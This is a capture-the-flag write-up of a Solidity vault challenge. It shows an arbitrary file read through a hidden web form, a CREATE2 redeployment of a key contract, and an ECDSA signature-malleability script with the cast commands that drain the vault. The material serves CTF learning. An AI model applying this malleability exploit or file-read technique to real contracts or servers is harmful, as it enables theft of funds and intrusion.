+++
date = '2025-03-17T15:01:20+01:00'
draft = false
title = 'WriteUp - Breizh CTF 2025 - Blockchain - ByBreizh'
tags = ["Blockchain", "BreizhCTF", "WriteUp"]
+++


| Difficulty | Hard               |
| ---------- | ------------------ |
| Flaggerz   | 1/120              |
| Author     | K.L.M. (@clemhate) |


This weekend, I played the BreizhCTF with `Not an Apt` and first blooded all challenges made by `K.L.M.` from the `Blockchain` category. 🩸  
I was the only one to solve `ByBreizh` (the hardest one) and that pushes me to do this writeup.

Last year, we ended `110/120` but, this time, we proudly ended `10/120` thanks to the `blockchain` category. 🚀


**So, keep pwning !**

## 📝 Challenge's description


Oh non, la plateforme ByBreizh a été hackée par un Normand nommé CrêpesMaster. Il a volé toutes les crypto-monnaies des utilisateurs. Il aurait apparement créé une plateforme nommée ByNormandie pour se moquer de nous ! D'après les informations que nous avons, il serait possible de récupérer la clé privée de son portefeuille et d'accéder à son contrat intelligent lui permettant de gérer ses fonds. Nous avons besoin de vous, trouvez sa clé privée en exploitant son site web et récupérez les fonds volés en exploitant les contrats intelligents que vous trouverez ci-joint. (La factory est déjà déployée, à vous de la trouver :). La clé privée de CrêpesMaster est dans le fichier `/home/crepesmaster/notes.txt` sur le serveur web.



## 🔍 Steps

1. Retrieve `notes.txt` file from the website
2. Retrieve the `Create2Factory` address
3. Deploy the `Keyy` contract
4. Retrieve allowed signers
5. Sign a message and use a `malleability` attack to bypass checks
6. Destroy the vault

## 📃 Given files 

`Challenge.sol`
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKey {
    function Key() external view returns (string memory);
}

contract Challenge {

    address public owner = 0xa24b3f601C29a9d26af5C151D172ea716a23dF1c;
    address public keyContract = 0xDbCA158868a2701A82Fa2C7748038363eEFE07cf;
    address[4] public authorizedSigners;
    bool public unlocked;
    bool public solved = false;

    mapping(bytes32 => bool) public usedSignatures;

    event VaultUnlocked(address indexed by);
    event VaultDestroyed(address indexed by);

    constructor(address[4] memory _signers) {
        for (uint i = 0; i < _signers.length; i++) {
            authorizedSigners[i] = _signers[i];
        }
        unlocked = false;
    }

    function authenticate(
        bytes32 hash,
        uint8 v1, bytes32 r1, bytes32 s1,
        uint8 v2, bytes32 r2, bytes32 s2
    ) public {
        require(!unlocked, "Vault already unlocked");
        require(msg.sender == owner, "Only owner can unlock the vault");

        string memory key = IKey(keyContract).Key();
        require(
            keccak256(abi.encodePacked("Normandie4ever")) == keccak256(abi.encodePacked(key)), 
            "Invalid Key contract"
        );

        require(abi.encodePacked(v1, r1, s1).length == 65, "Signature 1 must be 65 bytes");
        require(abi.encodePacked(v2, r2, s2).length == 65, "Signature 2 must be 65 bytes");

        bytes32 sig1Hash = keccak256(abi.encodePacked(v1, r1, s1));
        bytes32 sig2Hash = keccak256(abi.encodePacked(v2, r2, s2));

        require(!usedSignatures[sig1Hash], "Signature 1 already used");
        require(!usedSignatures[sig2Hash], "Signature 2 already used");

        require(sig1Hash != sig2Hash, "Identical signatures not allowed");

        usedSignatures[sig1Hash] = true;
        usedSignatures[sig2Hash] = true;

        address signer1 = _recoverSigner(hash, v1, r1, s1);
        address signer2 = _recoverSigner(hash, v2, r2, s2);

        require(_isAuthorized(signer1), "Signer1 not authorized");
        require(_isAuthorized(signer2), "Signer2 not authorized");

        unlocked = true;
        emit VaultUnlocked(msg.sender);
    }

    function destroyVault(address emergencyAddr) public {
        // No self destruct but imagine it was here :))
        require(unlocked, "Vault is locked");
        emit VaultDestroyed(msg.sender);
        payable(emergencyAddr).transfer(address(this).balance);
        solved = true;
    }

    function isSolved() public view returns (bool) {
        return solved;
    }

    function _isAuthorized(address signer) internal view returns (bool) {
        for (uint i = 0; i < authorizedSigners.length; i++) {
            if (authorizedSigners[i] == signer) {
                return true;
            }
        }
        return false;
    }

    function _recoverSigner(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {
        return ecrecover(hash, v, r, s);
    }
}
```

`factory.sol`
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Create2Factory {
    event Deployed(address addr);
    
    function deploy(uint256 amount, bytes32 salt, bytes memory bytecode) public payable returns (address addr) {
        require(address(this).balance >= amount, "Fonds insuffisants");
        assembly {
            addr := create2(amount, add(bytecode, 0x20), mload(bytecode), salt)
        }
        require(addr != address(0), "Echec du deploiement");
        emit Deployed(addr);
    }
    function computeAddress(bytes32 salt, bytes32 bytecodeHash) public view returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            address(this),
            salt,
            bytecodeHash
        )))));
    }
}
```

## 🔍 Challenge's overview

#### `Challenge.sol`

By reading the `Challenge` contract, we can see that the goal is to set `solved` to `true`. The only way to achieve this is by successfully calling `destroyVault(address)`.

To call that function, we need to unlock the vault, which requires calling `authenticate(...)` with forged signatures.

> The `ecrecover()` function allows us to retrieve the signer of a message by providing the signed message and the signature.

> **Malleability attack**
> We can already identify a vulnerability in how `ecrecover()` is used. This function is susceptible to a **malleability** attack, meaning we can provide two different signatures that recover the same address. We'll explore this in more detail later.
> 

From this, we know the following :
- We need to find a way to become the contract owner (e.g., by retrieving its private key).
- We need to list the allowed signers to ensure we are authorized.
- We need to verify that the contract at `0xDbCA158868a2701A82Fa2C7748038363eEFE07cf` has a `Key()` function and that it returns `Normandie4Ever`.
- We need to sign a message and apply the malleability attack to generate two valid signatures.
- Finally, we destroy the vault.

#### `Factory.sol`

`Factory.sol` is a common contract used to deploy other contracts with the `create2` opcode.

## 🌐 Step 1 : Extract the `notes.txt` 

From the challenge's description, we know that we are looking for a file at `/home/crepesmaster/notes.txt`.

At this step, I was completely goofing around like an idiot, so I called my web guy, @Zleb, for help. I had forgotten to check the website's HTML, where a `display: none` form was hidden. This form allowed users to retrieve files directly from the filesystem.

All I had to do was enter `/home/crepesmaster/notes.txt` into the form to retrieve the file.

**notes.txt:**
```
Quels nullos ces bretons, et dire qu'ils avaient 5 signataires et qu'ils sont tous tombés dans le panneau...

Il faut que je mette ma clé privée quelque part sinon je vais la perdre.

0x3da2b9f371d75f03e91bbbeb1da81fac34721d71a2b12bd1ae547426a4b4f559

Aller, plus qu'a attendre quelques jours le temps de blanchir tout cet argent. 

LA BRETAGNE EST FINIE

D'ailleurs, je ne dois pas oublier que j'ai mis en place un contrat clé qui permet de deverouiller les interactions avec mon vault :))

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Keyy {
    string public Key;

    constructor() {
        Key = "Normandie4ever";
    }
}

salt : 0xad0a990189248f3b99ddf7978b28654f5261b05830d2b4356927726d9528810a

il n'y a que moi qui sait comment je peux deployer ce contrat a la bonne adresse hehehe. Et surtout uniquement moi qui connait l'adresse de ma factory :)

L'ADRESSE DE LA BLOCKCHAIN EST SUR LE PORT 9000
```

That file contains several important pieces of information :
- The user's private key: **`0x3da2b9f371d75f03e91bbbeb1da81fac34721d71a2b12bd1ae547426a4b4f559`**
- The **`Keyy` contract**, which we will discuss later
- A salt: **`0xad0a990189248f3b99ddf7978b28654f5261b05830d2b4356927726d9528810a`**
- Another website running on port **`9000`**

## 🏭 Step 2 : Retrieve the factory address 

Going to `http://bybreizh-56.chall.ctf.bzh:9000/`, we can retrieve additional information, such as:

- The RPC endpoint: `http://bybreizh-56.chall.ctf.bzh:9000/rpc`
- The Challenge contract's address: `0xfbEEAFDB30F30C6911063FBa83da402cD42156e0`

At this point, the goal is to retrieve the factory address. There are at least two ways to do this:

1. Compute the address using the deployer's address and nonce.
2. Retrieve it from transaction receipts.

I personally used the second method.

```bash
export RPC="http://bybreizh-56.chall.ctf.bzh:9000/rpc"
export PK="0x3da2b9f371d75f03e91bbbeb1da81fac34721d71a2b12bd1ae547426a4b4f559"
export TARGET="0xfbEEAFDB30F30C6911063FBa83da402cD42156e0"
```

1. Get the latest block number so I can iterate through all the blocks.
```bash
cast block  -r $RPC | grep number
# Response : 
number               3
```

2. List the transactions.
```bash
cast block 1 -r $RPC
# Response : 
# ...CROPPED...
# transactions: [
#         0x182bcc4daea89ae87484b154969fa7310e508fa6116cc81f6d64a4184212fb79]
# ]

cast block 2 -r $RPC
# Response : 
# ...CROPPED...
# transactions: [
#         0xbfabb57111d9e69036e2495dcf299e23fc93217994d19a0c3d7c71923d4e9323]
# ]

cast block 3 -r $RPC
# Response : 
# ...CROPPED...
# transactions: [
#        0xa1fd31073d0a2867b42dba30c92bf407685cc167ebecaa8ce421764a83053e2e
# ]
```

3. Get the receipts for all three transactions and retrieve the `contractAddress` attribute.
```bash
cast receipt 0x182bcc4daea89ae87484b154969fa7310e508fa6116cc81f6d64a4184212fb79 -r $RPC | grep contractAddress
# No response

cast receipt 0xbfabb57111d9e69036e2495dcf299e23fc93217994d19a0c3d7c71923d4e9323 -r $RPC | grep contractAddress
# No response

cast receipt 0xa1fd31073d0a2867b42dba30c92bf407685cc167ebecaa8ce421764a83053e2e -r $RPC | grep contractAddress
# Response : 
# contractAddress         0xad4967EA626502f0b8F89dc172F2BAa13397f1e2
```

We have found the factory !

## 🔑 Step 3 : Deploy the Keyy contract

From the Challenge's `authenticate()` method, we know that the `keyContract` must respond to `Key()` with `Normandie4Ever`.

```js
string memory key = IKey(keyContract).Key();
require(
	keccak256(abi.encodePacked("Normandie4ever")) == keccak256(abi.encodePacked(key)), 
	"Invalid Key contract"
);
```

The problem is that the contract is not deployed.  
The `notes.txt` hints us with: _"il n'y a que moi qui sais comment je peux déployer ce contrat à la bonne adresse hehehe."_  
And of course, there is no bytecode at that address.

```bash
cast code 0xDbCA158868a2701A82Fa2C7748038363eEFE07cf -r $RPC
# Response : 
# 0x            # 0x means no bytecode and no deployed contract
```

> I quickly understood that I will have to deploy it using the `Factory`, the contract's bytecode and the salt from step 1.

**Remember the Keyy contract found in step 1**
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Keyy {
    string public Key;

    constructor() {
        Key = "Normandie4ever";
    }
}
```

> While trying to pass this step, I struggled with compilers. I tried to compile with at least five different compilers, many solidity versions and none of them gave me the same bytecode for the same contract. 
 
> @K.L.M. finally gave the actual bytecode he used to compute the hardcoded address to players, though he didn’t know where the problem was either. Even changing the filename or adding spaces/comments would change the bytecode — this is completely WTF 🤯.

Now that we have all the requirements, we are able to deploy the `Keyy` contract with the following commands.

```bash
export FACTORY=0xad4967EA626502f0b8F89dc172F2BAa13397f1e2 # Factory address
export SALT=0xad0a990189248f3b99ddf7978b28654f5261b05830d2b4356927726d9528810a # From the notes.txt file
export BYTECODE=0x608060405234801561001057600080fd5b5060408051808201909152600e81526d2737b936b0b73234b29a32bb32b960911b602082015260009061004390826100e8565b506101a6565b634e487b7160e01b600052604160045260246000fd5b600181811c9082168061007357607f821691505b60208210810361009357634e487b7160e01b600052602260045260246000fd5b50919050565b601f8211156100e357806000526020600020601f840160051c810160208510156100c05750805b601f840160051c820191505b818110156100e057600081556001016100cc565b50505b505050565b81516001600160401b0381111561010157610101610049565b6101158161010f845461005f565b84610099565b6020601f82116001811461014957600083156101315750848201515b600019600385901b1c1916600184901b1784556100e0565b600084815260208120601f198516915b828110156101795787850151825560209485019460019092019101610159565b50848210156101975786840151600019600387901b60f8161c191681555b50505050600190811b01905550565b61019a806101b56000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063f39d8c6514610030575b600080fd5b61003861004e565b60405161004591906100dc565b60405180910390f35b6000805461005b9061012a565b80601f01602080910402602001604051908101604052809291908181526020018280546100879061012a565b80156100d45780601f106100a9576101008083540402835291602001916100d4565b820191906000526020600020905b8154815290600101906020018083116100b757829003601f168201915b505050505081565b602081526000825180602084015260005b8181101561010a57602081860181015160408684010152016100ed565b506000604082850101526040601f19601f83011684010191505092915050565b600181811c9082168061013e57607f821691505b60208210810361015e57634e487b7160e01b600052602260045260246000fd5b5091905056fea264697066735822122044ec8427a98460fbe813a03818ae6054ddcef31b447bff71f92ff20c58c9499464736f6c634300081c0033 # From the KLM hint

cast send $FACTORY "deploy(uint256,bytes32,bytes)" 0 $SALT $BYTECODE -r $RPC --private-key $PK
```

Verify that the contract is well deployed
```bash
cast code 0xDbCA158868a2701A82Fa2C7748038363eEFE07cf -r $RPC
# Response : 
0x0x60806040523480156100105760...CROPPED...4300081c0033
```

# ✍ Step 4 : Retrieve allowed signers

In order to make sure we are allowed to sign a message, we need to ensure we are in the `allowedSigners` array.

```bash
for k in {0..3}; do                                                     
	cast call $TARGET "allowedSigners(uint256)" $k -r RPC
done

# Response : 
0xa24b3f601c29a9d26af5c151d172ea716a23df1c # This is our address
0x7ad65dfcf42e961ba3e7d59fa4368590a65d87f2
0x900c6a8295c23a1e031b39604fd14789028b1899
0xea5511ec9df4ae6fe20e2480d7e60cfce2556f01
```

**There is one good news:** we are allowed to sign messages with our private key.  
**There is a bad news:** `authenticate()` requires two different signatures.

But hey, it doesn't require two different signers! And the `ecrecover()` function used is vulnerable to malleability attacks.

## 💥 Step 5 : Malleability attack

> **Malleability attack**
> There is a quite famous vulnerability that makes `ecrecover()` recover the same signer with two different signatures.  
> I won't dig into the cryptographic reasons behind the concept, but basically, a signature is based on three variables:
> - `r` (32 bytes)
> - `s` (32 bytes)
> - `v` (1 byte) — v stands for version. A valid signature can be either from version 27 or 28, making the two signatures distinct from each other. Note that `s` also changes when `v` changes.
> 

1. I retrieved a random signed message from the internet because I was goofing around like an idiot and wasn't able to sign my own...
```
0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd
```

2. I signed it to retrieve the first signature.
```bash
cast wallet sign 0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd --no-hash --private-key $PK
# Response : 
0x057eb35d3f205ede93954f20a4181c7f6227bc4da26c0752f976b4727b12bd2b565b4412fc85cc9f36dab827788e5171f957da5b31be50d6bbeba9b9dab23c571c
```

`malleable.py`
```python
from web3 import Web3
signature = Web3.to_bytes(hexstr="0x057eb35d3f205ede93954f20a4181c7f6227bc4da26c0752f976b4727b12bd2b565b4412fc85cc9f36dab827788e5171f957da5b31be50d6bbeba9b9dab23c571c")

def malleable_same_signer(signature) :
    assert len(signature) == 65, "Signature should be 65 bytes"
    r = int.from_bytes(signature[:0x20], 'big')
    s = int.from_bytes(signature[0x20:0x40], 'big')
    v = int.from_bytes(signature[0x40:0x41], 'big')
    assert 27 <= v <= 28, "v should be 27 or 28, nothing else"
    
    print(f"r: {r}")
    print(f"s: {s}")
    print(f"v: {v}")

    s_prime = (-s) % 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    print(f"s_prime : {s_prime}")
    v_prime = 27 if v == 28 else 28
    print(f"v_prime : {v_prime}")
    
    # Create the new signature
    new_signature = signature[:0x20] + s_prime.to_bytes(0x20, 'big') + bytes([v_prime])
    
    # print(f"New Signature: {new_signature.hex()}")
    return new_signature

new_signature = malleable_same_signer(signature)
print(f"New malleable same signer signature 0x{new_signature.hex()}")
```

```bash
# Response : 
r: 2485424899597514784210716504566262273560729033256209567338553620505784663339
s: 39060157891680103482919590924916420838513213186574676933954172474298230520919
v: 28

s_prime : 76731931345636091940651394083771487014324351092500227448650990667219930973418
v_prime : 27
New malleable same signer signature 0x057eb35d3f205ede93954f20a4181c7f6227bc4da26c0752f976b4727b12bd2ba9a4bbed037a3360c92547d88771ae8cc157028b7d8a4f6503e6b4d2f58404ea1b    
```

At this moment, we have all the pieces to solve this challenge:

- The `Keyy` contract is deployed.
- We have two different signatures that return a valid signer.
- The signed message.

By splitting both signatures into `r` (bytes32), `s` (bytes32), and `v` (bytes1), we obtain the following authentication command.

```bash
cast send $TARGET "authenticate(bytes32,uint8,bytes32,bytes32,uint8,bytes32,bytes32)" \
	0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd \
	27 0x057eb35d3f205ede93954f20a4181c7f6227bc4da26c0752f976b4727b12bd2b 0xa9a4bbed037a3360c92547d88771ae8cc157028b7d8a4f6503e6b4d2f58404ea \
	28 0x057eb35d3f205ede93954f20a4181c7f6227bc4da26c0752f976b4727b12bd2b 0x565b4412fc85cc9f36dab827788e5171f957da5b31be50d6bbeba9b9dab23c57  \
	-r $RPC --private-key $PK
```

## 🏁 Step 6 : Destroy the vault

This step is a common call to a function, nothing much interesting but required to destroy the vault and solve the chall.

```bash
cast send $TARGET "destroyVault(address)" 0xa24b3f601C29a9d26af5C151D172ea716a23dF1c  -r $RPC --private-key $PK
```

**Challenge solved**

> Note : I forgot to save the flag but I promise I flagged it... 🤡
